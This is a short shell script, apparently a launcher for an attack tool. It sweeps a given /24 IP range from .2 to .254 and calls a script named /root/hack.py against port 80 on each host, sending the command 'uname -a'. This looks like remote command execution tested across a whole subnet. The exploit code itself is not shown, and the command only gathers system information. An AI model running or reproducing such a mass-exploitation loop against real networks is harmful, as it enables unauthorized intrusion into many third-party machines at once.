#!/bin/sh
 
numero=2
limite=255
plage=$1
 
while test $numero != $limite
    do 
    python /root/hack.py -h $plage.$numero -p 80 -c 'uname -a' 
    numero=$(($numero + 1))
done